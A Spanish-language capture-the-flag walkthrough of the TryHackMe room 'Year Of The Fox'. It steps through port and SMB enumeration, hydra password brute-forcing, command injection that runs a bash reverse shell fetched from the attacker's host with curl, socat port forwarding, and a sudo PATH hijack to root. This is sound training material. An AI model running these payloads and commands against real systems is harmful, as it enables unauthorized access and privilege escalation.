---
title : MQ|FOX|SMB|JAVA|RCE|SOCAT|PATH.HCK
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="/imgs/YerOfTheFox/YerOfTheFox0.png" style="border-radius: 150px; width: 169px" alt="Calamity log">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Difícil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/r/room/yotf" style="color: lightblue;">Year Of The Fox</a></p>
    </div>
</div>

<h2><font color="white"><center># Fox</center></font></h2>

* Empezamos lanzando un ping a la maquina para observar la trazabilidad de conexión y enumerar por su ttl el sistema operativo, que en este caso es una maquina Linux.

```java
# ping 10.10.92.139 -c1 -R
PING 10.10.92.139 (10.10.92.139) 56(124) bytes of data.
64 bytes from 10.10.92.139: icmp_seq=1 ttl=60 time=410 ms
RR: 	10.17.21.18
	10.16.107.119
	10.10.92.139
	10.10.92.139
	10.17.0.1
	10.17.21.18


--- 10.10.92.139 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 410.246/410.246/410.246/0.000 ms
```

* Ahora procedemos a enumerar puertos abiertos en el servidor.

```java
# Nmap 7.94SVN scan initiated Thu Dec 19 14:29:55 2024 as: nmap --min-rate 5000 -sS -Pn --open -p- -A -sCV -v -oN all_services 10.10.92.139
Nmap scan report for 10.10.92.139

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
```
* Procedemos a ver el puerto http 80 que corre el servidor, y vemos que nos muestra un login.

<img src="imgs/YerOfTheFox/YerOfTheFox1.png">

* Usamos smbmap para listar carpetas compartidas, y vemos que no tenemos acceso.

        smbclient -H MAQUINA_IP 
         
```java
# smbmap -H 10.10.92.139
[+] Guest session   	IP: 10.10.92.139:445	Name: 10.10.92.139                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	yotf                                              	NO ACCESS	Fox's Stuff -- keep out!
	IPC$                                              	NO ACCESS	IPC Service (year-of-the-fox server (Samba, Ubuntu))
```

* Procedemos a usar enum4linux para enumerar mas a detalle usuarios y información relevante.

        enum4linux MAQUINA_IP

```java
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\fox (Local User)
 S-1-22-1-1001 Unix User\rascal (Local User)
```

* Usamos hydra para hacer un ataque con estos usuarios encontrados.

            hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f 10.10.92.139 http-head

```java
 # hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f 10.10.92.139 http-head
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, 
 hese *** ignore laws and ethics anyway).

 [80][http-head] host: 10.10.92.139   login: rascal   password: othello
 [STATUS] attack finished for 10.10.92.139 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
```

* Ahora con la credencial encontrada y el usuario vemos que hay en la pagina web.

<img src="imgs/YerOfTheFox/YerOfTheFox2.png">

* Usamos BurpSuite para controlar el trafico y hacer tests, vemos que usa cadenas java, en el apartado target, procedemos entonces a inyectar comandos 

        echo '/bin/bash -c "bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1"' > data # Creamos el archivo data.

        sudo python3 -m http.server 80 # Creamos el servicio compartido.

        nc -nlvp PUERTO # Nos ponemos en escucha.
        
        sintaxis "\";curl 10.17.21.18/data | bash;\"" # Lo que haces es dentro de 2 comillas simples colocar el comando a ejecutar y se separan para que no entren en conflicto las multiples comillas. de esta manera hacer que java interprete el comando.

<img src="imgs/YerOfTheFox/YerOfTheFox3.png">


* Ganamos acceso al sistema después de lanzar la petición.

```java
www-data@year-of-the-fox:/dev/shm$ whoami
www-data
```

* Procedemos a enumerar puertos internos de la maquina y vemos que hay un puerto ssh corriendo de manera interna.


        netstat -nl

```java
www-data@year-of-the-fox:/dev/shm$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:netbios-ssn     0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:microsoft-ds    0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:netbios-ssn        [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:microsoft-ds       [::]:*                  LISTEN 
```


* Vemos el archivo de configuración /etc/ssh/sshd_config y vemos que el usuario fox esta en lista de admitidos.

```java
www-data@year-of-the-fox:/dev/shm$ cat /etc/ssh/sshd_config  | tail -n 1
AllowUsers fox
```

* Procedemos a transferirnos socat para hacer port for warding y hacer el puerto ssh correr de manera local.

        ./socat.bin tcp-listen:8888,reuseaddr,fork tcp:localhost:22


<img src="imgs/YerOfTheFox/YerOfTheFox4.png">

* Procedemos a hacer un ataque con hydra con el usuario fox.

```java
 # hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.92.139 -s 8888 ssh

 [DATA] attacking ssh://10.10.92.139:8888/
 [8888][ssh] host: 10.10.92.139   login: fox   password: 147852
 1 of 1 target successfully completed, 1 valid password found
```
 
* Nos conectamos por ssh de manera satisfactoria.

        ssh fox@maquina_ip -p 8888

<img src="imgs/YerOfTheFox/YerOfTheFox5.png">

* A la hora de correr el comando sudo -l vemos que no hay un path de ruta segura, lo que lo implica a poder manipular esta ruta a la hora de correr comando como usuario sudo, de esta forma poder elevar privilegios.

```java
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

* Vemos que el binario /usr/sbin/shutdown lo que hace es llamar a shutdown de forma externa al parecer.

<img src="imgs/YerOfTheFox/YerOfTheFox6.png">

* Procedemos entonces a copiar el binario /bin/bash y pegar como /tmp/shutdown

```java
fox@year-of-the-fox:/dev/shm$ cp /bin/bash /tmp/shutdown
fox@year-of-the-fox:/dev/shm$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/dev/shm$ sudo /usr/sbin/shutdown
root@year-of-the-fox:/dev/shm# whoami
root
```

* Y listo lo que hicimos fue alterar la ruta para que primero busque por /tmp/ el binario shutdown si lo encuentra entonces este lo ejecutara, de esta forma nos da la shell como root puesto que renombramos el binario para que fuera shutdown en ves de bash. 